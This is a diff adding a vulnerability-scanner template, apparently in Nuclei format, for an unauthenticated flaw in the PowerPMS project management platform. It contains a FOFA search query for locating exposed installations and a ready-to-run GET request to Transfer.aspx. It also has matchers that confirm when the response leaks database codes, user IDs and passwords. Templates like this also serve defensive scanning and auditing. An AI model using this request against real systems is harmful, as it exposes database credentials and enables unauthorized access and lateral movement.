@@ -1,0 +1,28 @@
+id: powerpms-transfer-unauthorized-info-leak
+
+info:
+  name: "普华科技 PowerPMS Transfer.aspx 未授权敏感信息泄露"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+          上海普华科技PowerPMS项目管理平台的Transfer.aspx组件存在身份验证绕过缺陷。该接口在未实施有效访问控制的情况下，允许远程攻击者通过直接请求获取存储于系统中的数据库连接配置参数，导致敏感凭据暴露。攻击者可利用泄露的数据库凭证实施后续数据篡改、横向渗透等攻击行为。
+  tags: 普华科技
+
+http:
+  - raw:
+    - |
+      GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
+      Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - '"DataBaseCode":'
+      - '"UserID":'
+      - '"Pwd":'
+      condition: and
+    - type: status
+      status:
+      - 200
